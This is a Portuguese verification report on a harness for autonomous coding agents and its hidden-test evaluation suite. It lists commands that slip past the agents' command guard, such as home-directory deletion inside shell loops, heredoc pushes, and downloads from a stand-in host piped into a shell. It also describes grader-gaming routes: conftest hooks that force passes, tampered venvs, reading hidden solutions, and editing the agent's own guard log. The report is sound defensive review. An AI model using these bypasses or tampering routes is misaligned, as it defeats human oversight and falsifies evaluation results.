# Verificação independente (fase estática): preparação da E6 (`agents/`) e da E8 (`eval/`)

- **Data:** 29/10/2026, das 11:55 às 12:15.
- **Objeto:** `agents/` como está em `2de5b31` (com `3d0efb1` e `d11901a`) e `eval/` como está em `1f8e59f`.
- **Arquivos alterados durante a verificação:**
  - No início, o `git diff --stat` mostrava `eval/README.md | 28 +++-` e `eval/run.sh | 43 ++++--` (61 inserções, 10 remoções). O agente da E7 estava editando os dois.
  - Durante a verificação, essas mudanças entraram no commit `70a6d04` (o gancho `EVAL_WRAPPER`).
  - Avaliei a lógica de `1f8e59f`. Não tratei o gancho `EVAL_WRAPPER` como defeito: ele fica para o verificador da E7.
- **Método:** só verificação estática, porque a E4 estava rodando.
  - Fiz:
    - leitura completa dos arquivos;
    - `bash -n` e `py_compile`;
    - `agents/lib/test-guard.sh`;
    - 65 comandos montados para contornar a guarda, passados direto ao `guard.py`;
    - dry-run dos 5 `run.sh`, com uma HOME descartável e com a HOME real;
    - `npm view` com o cache do npm numa pasta descartável;
    - `stat` (só a data de modificação) das configurações reais.
  - Não rodei LLM, docker, jest, pytest, `validate.sh`, `run.sh` nem `matrix.sh` do eval.
- **Efeito colateral meu, já desfeito:**
  - O `python3 -I -m py_compile` criou 7 pastas `__pycache__` no repositório, porque o `-I` ignora `PYTHONPYCACHEPREFIX`.
  - Todas tinham data de criação entre 11:57:18 e 11:57:19, então nenhuma existia antes. Apaguei as 7 logo depois.
  - Fora este relatório, não alterei mais nada no repositório.

## Resumo

| Área | Veredito | Em uma linha |
|---|---|---|
| Contrato `run.sh` (5 agentes) | **PASS** | Os cinco usam o mesmo `parse_run_args`, `env.sh` e `run_agent`. `LLM_BASE_URL` e `LLM_MODEL` são respeitados, inclusive com `/v1/` no fim. Saída = código do agente; erro de argumento = 2. |
| Isolamento das configurações | **PARCIAL** | As configs geradas e o dry-run ficam isolados, conferido na HOME real. Mas o `install.sh` executa `<agente> --version` com a HOME real (**bloqueante**). No host, os agentes herdam variáveis da sessão do Claude Code orquestrador. |
| Versões e integridade npm | **PASS** | 5 de 5 hashes `dist.integrity` iguais ao registro. Há ressalvas menores sobre dependências transitivas e o `latest` do Qwen Code. |
| Perfis de permissão e guarda | **PARCIAL** | Os perfis são coerentes entre si. A guarda deixa passar sintaxe comum de shell (`if …; then rm -rf ~; fi`, `for …; do git push; done`, heredoc para `bash`). O README promete mais do que ela faz ("`git push` em qualquer forma"). |
| Claude Code `bypassPermissions` | **PARCIAL** | Só é alcançado pelo `run.sh` (ou por flag passada à mão ao lançador), sempre com `CLAUDE_CONFIG_DIR` isolado. Nada impede rodar no host. O README do `claude-local` não diz que é só dentro do container. |
| Checagens leves | **PASS** | `bash -n`: 46 de 46. `py_compile`: 13 de 13. `test-guard.sh`: todos os casos passaram. Dry-run: 5 de 5 sem executar nada e sem tocar nas configs reais. |
| Tarefas e prompts (T1–T7, S1–S3) | **PASS** | Os prompts são realistas e não citam os testes ocultos. Testes ocultos e soluções só entram no workdir durante a verificação. |
| Verificações ocultas | **PARCIAL** | São boas no geral, com três problemas. O T6 exige uma semântica que a especificação não define. O T5 aprova a causa raiz por palavras-chave, sem revisão obrigatória. A proteção da configuração de testes tem lacunas (`conftest.py` fora da lista, `pytest.toml`, `.venv`/`node_modules`). |
| Mutantes (T4, S3) | **PARCIAL** | Os 18 mutantes são significativos. Mas qualquer arquivo de teste já existente que o agente altere entra na conta e infla a nota do T4. |
| Runner, esquema e agregação | **PASS** | A lógica está correta. Há ressalvas menores: o critério da Meta 1 ignora intervenções e ações destrutivas, e erro de infraestrutura nas verificações vira `fail`. |

**1 bloqueante, 7 importantes e 9 menores** (lista no fim). Para o eval nenhum problema é bloqueante. O bloqueante é do `agents/install.sh` e só vale para a instalação no host.

---

## 1. `agents/`: contrato do `run.sh`: PASS

- Todos os `run.sh` fazem a mesma coisa: `set -euo pipefail`, depois `source lib/common.sh`, `parse_run_args "$@"`, `source env.sh` e `run_agent <agente> -- …`.
- O `parse_run_args` faz o seguinte:
  - valida os três argumentos (aceita também `--x=valor`);
  - resolve os caminhos com `pwd -P`;
  - recusa prompt vazio ou com 120 KB ou mais;
  - acrescenta `\n` ao prompt que começa com `-`;
  - usa `AGENT_PROFILE=autonomous` por padrão;
  - cria `AGENT_HOME=<log-dir>/home`.
- O `run_agent` faz o seguinte:
  - grava `command.txt` com `@PROMPT@` no lugar do prompt;
  - no `AGENT_DRY_RUN=1`, imprime e retorna 0 antes de qualquer execução;
  - nos outros casos, roda com `cd workdir`, stdin `/dev/null` e o `timeout` opcional;
  - grava `run-meta.json` e `agent-metrics.json`, o segundo sem mudar o código de saída;
  - devolve o código do agente.
- Códigos de saída: o do agente; 2 em erro de argumento (`die`); 124 ou 137 no timeout.

Dry-run com HOME descartável, `LLM_BASE_URL=http://127.0.0.1:9999/v1/` e `LLM_MODEL=modelo-x` (trecho):

```
$ env -i HOME=$S/dry/home PATH=/usr/local/bin:/usr/bin:/bin AGENT_DRY_RUN=1 LLM_BASE_URL=http://127.0.0.1:9999/v1/ \
    LLM_MODEL=modelo-x OPENAI_API_KEY=sk-real-should-not-leak ANTHROPIC_API_KEY=sk-ant-should-not-leak \
    bash agents/<h>/run.sh --workdir $S/dry/work --prompt-file $S/dry/prompt.txt --log-dir $S/dry/log-<h>
qwen-code    … qwen --prompt=@PROMPT@ --output-format stream-json --approval-mode yolo                     rc=0
codex-local  … codex exec --json --color never --cd … --skip-git-repo-check --output-last-message …
               --profile autonomous --model modelo-x --dangerously-bypass-hook-trust @PROMPT@            rc=0
pi           … pi --mode json --provider local --model modelo-x --thinking medium --no-approve -e …/guard.ts @PROMPT@  rc=0
opencode     … opencode run --format json --model llamacpp/modelo-x --dir … --title eval\ 2026… --print-logs --log-level INFO --auto @PROMPT@  rc=0
claude-local … claude -p --output-format stream-json --verbose --model modelo-x --tools Bash\,Read\,Edit\,Write
               --setting-sources user --exclude-dynamic-system-prompt-sections --permission-mode bypassPermissions @PROMPT@  rc=0
```

- URL nos 5 arquivos gerados: `http://127.0.0.1:9999/v1`, com o `/v1/` do fim removido e reposto uma vez só.
- O modelo `modelo-x` aparece 9 vezes.
- Todos os JSON são válidos (`jq`) e nenhuma chave `//` sobrou.
- O TOML do Codex é válido (`tomllib`): `model_auto_compact_token_limit=98304`, `hooks.PreToolUse[0].matcher='Bash'`.
- O `local.rules` tem as 9 `prefix_rule`.
- O hook aponta para `python3 -I "/home/leandro/me/local/agents/lib/guard.py"` nos três agentes que usam hook. No container, `agents/` é montado no mesmo caminho (`sandbox/run-in-box.sh:121`).

## 2. `agents/`: isolamento: PARCIAL

### O que está certo

| Agente | Variável | Onde fica | Conferido |
|---|---|---|---|
| Qwen Code | `QWEN_HOME` | `<log-dir>/home/qwen` | `env.sh`; lê também `~/.env` (documentado; não existe aqui) |
| Codex | `CODEX_HOME` | `<log-dir>/home/codex` | `env.sh`; apaga `OPENAI_API_KEY`, `CODEX_API_KEY`, `OPENAI_BASE_URL`, `OPENAI_ORG_ID`, `OPENAI_PROJECT_ID` |
| Pi | `PI_CODING_AGENT_DIR` | `<log-dir>/home/pi` | `env.sh` |
| OpenCode | `XDG_CONFIG/DATA/CACHE/STATE_HOME` | `<log-dir>/home/opencode/*` | `env.sh`; `OPENCODE_DISABLE_CLAUDE_CODE=1` e `OPENCODE_DISABLE_EXTERNAL_SKILLS=1` (não lê `~/.claude`/`~/.agents`) |
| Claude Code | `CLAUDE_CONFIG_DIR` | `<log-dir>/home/claude` | `env.sh`; apaga `ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, Bedrock/Vertex/Foundry |

- Nenhum script nem config cita `~/.claude`, `~/.claude.json`, `~/.codex`, `~/.gemini`, `~/.qwen`, `~/.config/opencode` ou `~/.pi` como caminho de leitura ou escrita. Esses nomes só aparecem em comentários.
- O `grep` nos arquivos gerados não achou caminhos da HOME real nem as chaves falsas que injetei (`sk-real…`, `sk-ant…`):

```
$ grep -rnE '/home/leandro/(\.claude|\.codex|\.qwen|\.gemini|\.pi|\.config|\.agents)|sk-real|sk-ant' log-*
(nenhuma)
```

- A HOME descartável continuou vazia depois dos 5 dry-runs (`find $S/dry/home` mostrou só a raiz).
- Repeti os dry-runs com a **HOME real** e comparei a data de modificação dos caminhos que não mudam sozinhos:

```
antes == depois:
/home/leandro/.codex 1793217734 · /home/leandro/.gemini 1793118412 · /home/leandro/.agents 1789384635
~/.qwen, ~/.config/opencode, ~/.local/share/opencode, ~/.pi, ~/.local/opt/agents: ausentes antes e depois
```

`~/.claude` e `~/.claude.json` mudam o tempo todo por causa da própria sessão do orquestrador. Por isso a data deles não serve de prova, nem aqui nem na E6: a prova tem que vir do container ou de uma HOME descartável.

### O que falha

- **B1: `agents/install.sh` executa cada agente com a HOME real.**
  - A última linha de `install_one` é `"$dest/bin/$exe" --version || true`, sem `HOME` temporária e sem as variáveis de isolamento.
  - A própria E7 registrou o efeito em `sandbox/install-agents.sh`: *"O --version de alguns agentes cria arquivos na HOME; nada disso fica na imagem"*. Por isso o script da E7 troca a `HOME` por uma pasta temporária.
  - No host, o mesmo comando pode criar `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.cache/opencode`, `~/.pi` ou mexer em `~/.codex`/`~/.claude.json`.
  - Não executei para confirmar: os binários não estão instalados e a instalação não cabia nesta fase. Mesmo assim, é exatamente o tipo de vazamento que o README diz não existir, e a correção é de uma linha.
- **I4: variáveis da sessão do orquestrador passam para o agente no host.**
  - O ambiente desta sessão tem `CLAUDECODE`, `CLAUDE_CODE_SESSION_ID`, `CLAUDE_CODE_MESSAGING_SOCKET`, `CLAUDE_CODE_MESSAGING_TOKEN`, `CLAUDE_CODE_BRIDGE_SESSION_ID`, `CLAUDE_CODE_CHILD_SESSION`, `CLAUDE_CODE_ENABLE_TELEMETRY`, `CLAUDE_EFFORT`, `CLAUDE_CODE_ENTRYPOINT` e `CLAUDE_CODE_EXECPATH`. Só listei os nomes, não os valores.
  - `claude-local/env.sh` não apaga nenhuma delas. `qwen-code/env.sh` e `pi/env.sh` também não apagam `OPENAI_*`.
  - Dentro do container isso não acontece, porque o `run-in-box.sh` só repassa variáveis de uma lista (`sandbox/run-in-box.sh:167-176`).
  - No host acontece. Exemplos: `measure-preamble.sh` chamado pelo orquestrador, ou um lançador aberto num terminal dentro de uma sessão do Claude Code. O Claude local herdaria o socket e o token de mensagens da sessão pai.

## 3. `agents/`: versões e integridade: PASS

```
$ npm view --cache <descartável> <pkg>@<ver> dist.integrity      (comparado com agents/versions.env)
OK @qwen-code/qwen-code@0.26.3            publicado 2026-10-28  (dist-tags.latest agora = 0.26.4)
OK @earendil-works/pi-coding-agent@1.4.0  publicado 2026-10-21  (latest = 1.4.0)
OK opencode-ai@1.19.5                     publicado 2026-10-28  (latest = 1.19.5)
OK @anthropic-ai/claude-code@2.1.308      publicado 2026-10-22  (stable = 2.1.308, latest = 2.1.312)
OK @openai/codex@0.165.0                  publicado 2026-10-27  (latest = 0.165.0)
```

- Os binários nativos vêm em dependências opcionais com versão exata e sem hash fixado no `versions.env`: `@openai/codex@0.165.0-linux-x64`, `@anthropic-ai/claude-code-linux-x64@2.1.308` e `opencode-linux-x64@1.19.5`. O npm não aceita publicar de novo a mesma versão, então o risco é pequeno.
- O Pi tem 22 dependências com versão exata, mas as dependências delas podem variar, porque a instalação não usa lockfile (M2).
- `postinstall`: só `opencode-ai` (`node ./postinstall.mjs`) e `claude-code` (`node install.cjs`), como o README diz.
- O `install.sh` compara o `dist.integrity` publicado no registro, sem calcular o hash do arquivo baixado. O `sandbox/install-agents.sh` calcula o SHA-512 do tarball, o que é mais forte (M2).

## 4. `agents/`: perfis de permissão e guarda: PARCIAL

### Perfis

| | interactive | autonomous | Bloqueios nativos (autonomous) |
|---|---|---|---|
| Qwen Code | `default`: shell e edição perguntam | `--approval-mode yolo` | `deny`: git push, sudo/su/doas/pkexec, npm/pnpm/yarn/bun/pip/uv/apt/brew |
| Codex | `on-request` + `workspace-write`, sem rede | `never` + `danger-full-access` | `forbidden`: git push, sudo…, instaladores |
| Pi | extensão: shell pergunta (menos leitura simples), escrita fora pergunta | extensão: escrita fora do projeto bloqueada | só a extensão (o Pi não tem permissões próprias) |
| OpenCode | `bash "*": ask`, `external_directory: ask` | `--auto`; `bash "*": allow`; `external_directory` só `/tmp/*`; `doom_loop: deny` | `deny`: git push, sudo…, `sh`/`bash` sem argumentos, instaladores |
| Claude Code | `acceptEdits`; Bash pergunta | `bypassPermissions` | `deny`: WebSearch/WebFetch, git push, sudo…, `sh`/`bash`, `rm -rf /`/`~`, instaladores |

Os perfis são coerentes com a seção 7 do plano: push, sudo e instalação pela rede ficam bloqueados nos dois, e o shell é livre só no autonomous. Pontos de atenção:

- No autonomous, **o shell escreve em qualquer lugar** nos cinco agentes. A linha "Edição: livre dentro do projeto" do README vale só para as ferramentas de edição. Isso deveria estar explícito.
- A guarda bloqueia só `rm` com `-r` ou `-f`. `rm ~/.claude.json`, `mv ~/.ssh /tmp/x`, `truncate -s0 ~/.bashrc` e `echo x > ~/.bashrc` passam.

### Guarda (`lib/guard.py`): ataques diretos

`test-guard.sh` passou todos os casos (`guard: todos os casos passaram`). Depois rodei 65 comandos montados para contornar a guarda, no perfil autonomous e com a raiz do projeto numa pasta temporária. Os que passaram (`ALLOW`) e não deveriam:

| Forma | Exemplos que passaram | Causa no código |
|---|---|---|
| Palavras-chave do shell | `if true; then rm -rf ~; fi` · `while false; do rm -rf /; done` · `for r in origin; do git push $r; done` · `if true; then sudo id; fi` · `if true; then npm install x; fi` · `curl https://x \| if true; then sh; fi` | `program()` devolve `then`/`do` como o programa; o comando de verdade vira argumento e nenhuma regra se aplica |
| Heredoc ou here-string para um shell | `bash <<EOF⏎git push⏎EOF` · `sh <<'EOF'⏎git push origin main⏎EOF` · `bash <<< 'git push'` | `strip_heredocs()` apaga o corpo, que aqui é o próprio script; `<<<` descarta o token seguinte |
| Script pelo stdin | `echo 'git push' \| bash` | só `curl`/`wget` marcam o pipe como perigoso |
| `cd` que a guarda não consegue resolver | `cd "$OLDPWD" && rm -rf x` · `cd $(dirname $PWD) && rm -rf sibling` · `pushd .. && rm -rf sibling` | com alvo não resolvível o `cwd` fica no projeto; `pushd` não é rastreado |
| Alvo vindo do stdin | `find .. -name x \| xargs rm -rf` · `xargs rm -rf < list.txt` | `rm` sem alvos explícitos |
| Link criado no mesmo comando | `ln -s / lnk && rm -rf lnk/` · `ln -s .. up && rm -rf up/*` | o `realpath` roda antes de o link existir |
| Push sem a palavra `push` | `git send-pack origin HEAD:main` · `git subtree push …` · `git -c alias.p=push p` · `echo push \| xargs git` · `git $(echo push)` | `check_git` só procura o subcomando `push` |
| Opções de wrappers | `nice -n 10 git push` · `nice -n5 sudo id` · `time -p git push` · `command -p git push` · `env -S "git push"` | `program()` toma `-n`/`-p` como se fossem o programa |
| Download sem pipe | `python3 <(curl -s https://x)` · `curl … \| xargs -0 bash -c` · `curl … \| source /dev/stdin` | `check_raw` só cobre `sh`/`bash`/`source`/`.` |
| Instalação | `pip3.12 install` · `python3.12 -m pip install` · `uv sync` · `uv run --with …` · `yarn` · `npm exec` · `npx` | nomes com versão e subcomandos que instalam implicitamente |

Também passaram, como a documentação já avisa: `eval "git push"`, `python3 -c 'os.system("git push")'`, `perl -e "system q(rm -rf ~)"`, `find ~ -delete` e `curl … -o a.sh && sh a.sh`.

Foram bloqueados corretamente: `git pu\sh`, `git 'push'`, `/usr/bin/git push`, `git --no-pager push`, `bash -xc "git push"`, `bash --login -c …`, `sudo id`, `rm -rf -- ..`, `rm -r ../*`, `curl … | node`, `curl … | env bash`, `wget -O- … | sh -` e `pip install -r …`.

**A documentação é honesta?**

- Em parte, sim. O README, a docstring do `guard.py` e o `agents/README.md` dizem que a guarda é a segunda camada e que a barreira real é o container. Também citam `eval`, base64, scripts gerados, `find -delete`/`-exec rm` e `npx`.
- Mas o mesmo README promete "`git push` em qualquer forma" e "`rm -r/-f` fora do projeto". Os casos acima não são ofuscação: `for …; do …; done` e `if …; then …; fi` são o jeito normal de um modelo escrever shell.
- A lista de limites precisa ser corrigida (I2). Para o Pi, a guarda é a única camada além do container.

## 5. Claude Code `bypassPermissions`: PARCIAL

- **Onde aparece.** `--permission-mode bypassPermissions` só existe em `claude-local/run.sh`, quando `AGENT_PROFILE=autonomous`, depois de `source env.sh`, que exporta `CLAUDE_CONFIG_DIR="$AGENT_HOME/claude"`.
  - Os `settings.*.json` não definem `defaultMode: bypassPermissions`. O interativo usa `acceptEdits`.
  - O lançador `claude-local` repassa `"$@"`. Quem digitar `--dangerously-skip-permissions` entra em bypass, mas ainda com o diretório isolado.
  - Não há caminho para o bypass que use `~/.claude`. **PASS** nesse ponto.
- **"Precisa rodar no container da E7".**
  - Nem `agents/README.md` nem `agents/claude-local/README.md` dizem isso. O que dizem é que "o container é a barreira real".
  - Quem diz são `eval/README.md` ("rode sempre pelo container", acrescentado pela E7), `sandbox/README.md` e a seção 8 do plano.
  - O `agents/codex-local/README.md` ainda diz "Fora do container (E6, no WSL) … `CODEX_LOCAL_SANDBOX=workspace-write`". Isso ficou desatualizado depois que a E7 passou a rodar antes da E6.
  - Nenhum código impede o modo autonomous no host. O `agents/measure-preamble.sh` chama o `run.sh` direto, e o `agents/README.md` manda rodá-lo assim (I3).
- `--setting-sources user` faz o eval ignorar os hooks e as permissões do repositório testado. O lançador interativo não usa essa opção, de propósito: no uso diário o projeto é do usuário.

## 6. `eval/`: tarefas e prompts: PASS

| Tarefa | Prompt | Verificação | Observação |
|---|---|---|---|
| T1 | Pedido realista; não cita gabarito | `codigo_inalterado` (src, test), ≥ 300 palavras, gabarito de 10 fatos (nota manual) | Gabarito específico e verificável |
| T2 | Relato de usuário com reprodução | 6 testes ocultos (original + ramos, dialetos, UPDATE, `immutable=False`) + suíte | Não depende da forma da correção; o pedido de "um teste" não é conferido (M7) |
| T3 | Especificação completa | 25 pares pt/en + strict + frase + negativos | Compara com o inglês, não com a solução: bom |
| T4 | Pede testes de `duration.ts` em arquivo definido | módulo inalterado + 12 mutantes ≥ 60% + suíte | Ver seção 7 |
| T5 | Sintoma realista; nomeia os testes que falham | hidden (repetibilidade, strict×casual, várias referências) + suíte + relatório | Armadilha boa: tornar `addDuration` imutável quebra outro teste. Causa raiz por palavras-chave (I6) |
| T6 | Especificação detalhada + plano | 21 testes ocultos + plano (nota manual) | Um teste exige algo que a especificação não diz (I5) |
| T7 | Revisão do diff não commitado | 10 testes ocultos (regressão + recurso) + suíte | "Inclusive em código que já existia" é uma dica leve, aceitável num pedido de revisão |
| S1–S3 | Curtos e realistas | hidden/suíte; S3 com 6 mutantes | S2 confere a remoção das cópias pelo texto do código, o que é aceitável |

- **Fora do workdir.**
  - `hidden/*` é copiado só durante a verificação e removido logo depois, num `finally`.
  - Se o agente tiver criado um arquivo com o mesmo nome, ele é guardado como `.agent-orig` e devolvido no fim.
  - As soluções só entram pelo `validate.sh` e pelo `fake-oracle`.
  - O workdir é um commit único sem o histórico do upstream. Os `AGENTS.md`/`CLAUDE.md` do upstream são apagados.
  - Não existe `AGENTS.md`/`CLAUDE.md`/`QWEN.md` em `~`, `~/.cache`, `~/.cache/local-agentic` nem em `/`. Conferi só a existência.
- **Ressalva.** Sem `EVAL_WRAPPER`, o agente consegue ler `eval/tasks/*/hidden` e as `solution.patch` no disco. Também consegue ler os workdirs de execuções anteriores, inclusive de outros agentes: com `EVAL_CLEANUP=deps`, as fontes ficam em `~/.cache/local-agentic/eval-work/<run>/<h>/<tarefa>/repo`. O README avisa e a E7 resolve.
- **Editar ou apagar testes não ajuda.**
  - `baseline_tests` restaura os testes que o agente alterou antes de rodar a suíte.
  - `restore_protected_config` restaura ou apaga a configuração listada em `repo.json`.
  - O `baseline` vem do `run.sh` (`--baseline`), não do repositório do agente.

## 7. `eval/`: verificações e mutantes: PARCIAL

- **Mutantes.**
  - T4: 12 mudanças de uma linha, cada uma com efeito observável: abreviação de ano/ms, fator do trimestre, frações, sinal da hora, desvio de um minuto, `reverseDuration` que não inverte, mês como 30 dias, `round`→`floor`.
  - S3: 6 mutantes: `all`→`any`, `None`→`False`, escape de aspas, aspas padrão, `AS` trocado, precedência de `alias_quote_char`.
  - Nenhum é equivalente ao código original.
  - Segundo o README e o resultado `e2e-oracle`, a solução de referência mata 12 de 12 e 6 de 6.
- **Inflação da nota de mutação (I7).**
  - `check_mutation` conta como "testes do agente" **qualquer** arquivo de teste novo ou alterado.
  - No chrono, `test/en/en_time_units_ago.test.ts`, `…_later` e `…_within` (36, 36 e 47 `testSingleCase`) passam por `addDuration`/`reverseDuration`.
  - Um agente que mexa num deles, mesmo de passagem, ganha esses testes na conta de mutantes mortos sem escrever bons testes para `duration.ts`.
  - O campo `exclude_tests` existe, mas não é usado.
- **T5 é aprovado por palavras-chave (I6).**
  - Os grupos são `["parsedDurationCache","cache","memo"]` e `["addDuration","muta",…,"shared"]`.
  - "muta" casa com "imutável" e "cache" é genérico. Um relatório que diga "problema de cache em estado compartilhado" passa.
  - O `status` sai `pass` automaticamente. O README diz que "o task.json marca a tarefa para conferência manual", mas a marca é só texto em `notes`: nenhum código lê esse campo, e o `summarize.py` não lista o T5 como pendente.
  - O critério do plano ("causa raiz correta no relatório") não é verificado de fato.
- **T6 exige algo fora da especificação (I5).**
  - `test_columns_branches_are_independent` espera `columns("a")` seguido de `.columns("b")` → `("a","b")`, ou seja, que as chamadas acumulem.
  - O `task.md` diz só que "`.columns("a", "b")` define a lista de colunas". Uma implementação que substitui a lista é válida pela especificação e falha no teste.
  - O teste mistura imutabilidade com acumulação.
- **Configuração de testes desprotegida (I1).** A lista `protected_config` do pypika cobre `pyproject.toml`, `setup.cfg`, `pytest.ini`, `tox.ini`, `conftest.py` e `pypika/tests/conftest.py`. Ficam de fora:
  - `pypika/conftest.py` e qualquer outro `conftest.py` no caminho dos testes ocultos (`pypika/tests/test_hidden_*.py`). Um hook `pytest_runtest_makereport` ali força "passou".
  - `pytest.toml`, `.pytest.toml` e `.pytest.ini`. O pytest fixado é o 9.2.0, e o `_pytest/config/findpaths.py` do wheel em cache confirma: `CONFIG_LOADERS_BY_NAME = {"pytest.toml", ".pytest.toml", "pytest.ini", ".pytest.ini", "pyproject.toml", "tox.ini", "setup.cfg"}`, nessa ordem de precedência. Um `addopts = "-p <plugin do repo>"` entra.
  - `.venv/` e `node_modules/`, que estão em `.git/info/exclude`. O agente pode alterar o pytest, o jest ou o ts-jest, ou plantar um `.pth`/`sitecustomize`. Nada é reinstalado nem conferido antes das verificações.
  - No chrono, um `jest.config.cjs`/`.json` novo só quebraria o jest (conflito com o `"jest"` do `package.json`). O ts-jest não usa babel. Ali o risco é menor.
  - O plano registra, no harness-bench, casos de agente que leu o avaliador. Por isso o reforço vale a pena, embora o `agent.patch` mostre qualquer arquivo novo.

## 8. `eval/`: runner, esquema e agregação: PASS

Li `run.sh` (em `1f8e59f`), `matrix.sh`, `validate.sh`, `summarize.py`, `grade.py`, `lib/common.sh`, `lib/check.py`, `lib/result.py`, `lib/metrics.py`, `lib/sampler.py` e `harnesses/fake-oracle/run.sh`.

- **Correto:**
  - `run-id` e `harness` validados por regex.
  - Lock com `flock`.
  - Setup do zero, com commit-base de hash fixo.
  - `start_ref` por `git stash create`, que inclui o diff pendente do T7.
  - `agent.patch` com arquivos novos, por índice temporário, antes das verificações.
  - `--baseline` explícito.
  - `timeout -k 30`, com 124 e 137 registrados como `timed_out`.
  - Métricas do servidor com detecção de contador reiniciado.
  - `result.json` com o esquema documentado. O `grade.py` só aprova se `auto_checks_pass` for verdadeiro.
- **Conferido sem executar:** os `result.json` existentes em `eval/runs/e2e-oracle` e `e2e-negative` batem com o README. São 10 execuções:
  - 8 `pass` e 2 aguardando nota, que viraram `pass` depois do `grade.py`;
  - `noop` deu `fail`;
  - `timeout` deu `timed_out: true` e `fail`.
- **Menores:**
  - A tabela da Meta 1 do `summarize.py` não desconta `interventions` e não mede "nenhuma ação destrutiva", dois critérios do plano (M5).
  - Execuções com `error` entram no denominador dos 2/3, mas não na taxa de sucesso (M5).
  - Uma exceção numa verificação obrigatória vira `pass: False` com `infra_error`, e portanto `status: fail`. O `return 2` do `check.py` nunca é alcançado, e o `result.py` não usa `infra_errors`. Erro de infraestrutura é contado como falha do agente (M6).

---

## Problemas

| # | Severidade | Problema | Correção sugerida |
|---|---|---|---|
| B1 | **bloqueante** | `agents/install.sh` roda `<agente> --version` com a HOME real e sem as variáveis de isolamento. Pode criar ou alterar `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.pi`, `~/.codex` e `~/.claude.json`. A E7 já registrou que o `--version` grava na HOME. | Rodar com `HOME="$(mktemp -d)"` e `XDG_*` limpos, como faz o `sandbox/install-agents.sh`, ou ler a versão do `package.json` instalado. |
| I1 | importante | A proteção da configuração de testes tem lacunas: `conftest.py` fora da lista, `pytest.toml`/`.pytest.toml`/`.pytest.ini` (lidos pelo pytest 9.2), `.venv`/`node_modules` alteráveis. Um agente pode forçar os testes ocultos a passar. | Em `protected_config`, aceitar padrões (`**/conftest.py`, `pytest.toml`, `.pytest.toml`, `.pytest.ini`, `jest.config.*`). Antes das verificações, recriar `.venv`/`node_modules` do cache, sem rede, ou rodar com cópias limpas. |
| I2 | importante | A guarda deixa passar sintaxe comum: `if/then`, `for/do`, heredoc ou here-string para `bash`, `cd "$VAR"`/`pushd`, `xargs rm -rf`, `send-pack`/`subtree push`/alias, opções de `nice`/`time`/`command`/`env -S`. O README promete "`git push` em qualquer forma". | Tratar palavras-chave do shell (`if then elif else fi for while until do done case esac { } !`) como separadores. Avaliar o corpo do heredoc ou here-string quando o leitor for shell ou interpretador. Com `cwd` desconhecido, negar `rm -r/-f` relativo. Negar `rm -r/-f` vindo de `xargs`/`find -exec`. Cobrir `send-pack`, `subtree push` e `-c alias.*`. Tratar opções com argumento nos wrappers. Atualizar a lista de limites no README. |
| I3 | importante | Nada impede o modo autonomous no host (Claude em bypass, Qwen em yolo, Pi sem permissões, Codex em `danger-full-access`). O `measure-preamble.sh` chama o `run.sh` direto. Os READMEs de `agents/` e de `claude-local/` não dizem "só no container", e o do Codex ainda fala em "E6 no WSL". | No `run.sh`, recusar `AGENT_PROFILE=autonomous` fora do container, a menos que `AGENT_ALLOW_HOST=1`. O container pode marcar `AGENT_BOX=1`, ou o script pode conferir `/.dockerenv`. Atualizar os três READMEs e o uso do `measure-preamble.sh`. |
| I4 | importante | No host, o agente herda variáveis da sessão pai: `CLAUDECODE`, `CLAUDE_CODE_SESSION_ID`, `CLAUDE_CODE_MESSAGING_SOCKET/TOKEN`, `CLAUDE_CODE_BRIDGE_SESSION_ID`, `CLAUDE_EFFORT`… e `OPENAI_*` no Qwen e no Pi. | Em `run_agent` e nos lançadores, executar com `env -i` e uma lista de variáveis permitidas, como faz o `run-in-box.sh`. No mínimo, apagar `CLAUDECODE` e `CLAUDE_CODE_*`/`CLAUDE_*` que não foram definidas de propósito, e `OPENAI_*` no Qwen e no Pi. |
| I5 | importante | O teste oculto `test_columns_branches_are_independent` (T6) exige que `.columns()` acumule entre chamadas, o que não está na especificação. Uma solução válida reprova. | Reescrever o teste sem depender de acumular ou substituir (ramos a partir de uma base sem colunas), ou especificar no `task.md` que as chamadas acumulam, como no `create_table`. |
| I6 | importante | A causa raiz do T5 é aprovada por palavras-chave amplas ("cache", "muta" casa com "imutável") e o resultado vira `pass` sem revisão. O critério do plano não é verificado. | Fazer do relatório um item com nota (`pending_grading`) ou acrescentar `needs_review: true`, que o `summarize.py` liste. Exigir termos específicos ao mesmo tempo (`parseDuration`/`parsedDurationCache` **e** `addDuration`). |
| I7 | importante | Mutação (T4, S3): qualquer arquivo de teste já existente que o agente altere entra na conta. No T4, os testes de unidades de tempo em inglês já exercitam `duration.ts` e inflam a nota. | Contar só arquivos que não existem no baseline (ou o caminho pedido no prompt). Outra opção: descontar os mutantes que a versão do baseline desses arquivos já mata. |
| M1 | menor | O `latest` do Qwen Code virou 0.26.4. O README diz que 0.26.3 é o `latest`. | Atualizar o texto. A versão fixada continua válida. |
| M2 | menor | O `install.sh` confere a integridade publicada no registro, não o hash do arquivo baixado, e não usa lockfile (dependências transitivas variam). | Reaproveitar o método do `sandbox/install-agents.sh` (`npm pack` + SHA-512 do arquivo). Opcional: `npm-shrinkwrap` por agente. |
| M3 | menor | O agente pode alterar a própria config em `<log-dir>/home` (hooks, `deny`) e o `guard.log` durante a execução. A segunda camada e a métrica `guard_blocks` podem ser desligadas ou adulteradas. | Gerar a config numa pasta só de leitura no container, ou conferir o hash da config e do `guard.log` depois da execução. |
| M4 | menor | Na extensão do Pi, `write`/`edit` usam `path.resolve` sem `realpath`: um link dentro do projeto que aponta para fora passa. | Usar `fs.realpathSync` no diretório pai do alvo. |
| M5 | menor | A Meta 1 do `summarize.py` ignora `interventions` e ações destrutivas. `error` entra nos 2/3, mas não na taxa. | Contar como sucesso só `pass` com `interventions == 0`. Mostrar a mediana de intervenções e os bloqueios da guarda. Tratar `error` à parte. |
| M6 | menor | Erro de infraestrutura nas verificações vira `fail` do agente. | Propagar `infra_errors` para `status: error` no `result.py`, ou separar exceção de infraestrutura de falha do teste. |
| M7 | menor | O T2/S1 pedem "um teste" e o T6 pede documentação no README, mas nada disso é conferido. | Acrescentar uma verificação não obrigatória (arquivo de teste novo ou alterado, README alterado) para registrar. |
| M8 | menor | `tool_call_errors` não é comparável entre agentes: no Codex, comando com saída diferente de 0 conta como erro. | Na tabela da E6, mostrar a coluna por agente com a definição, ou normalizar. |
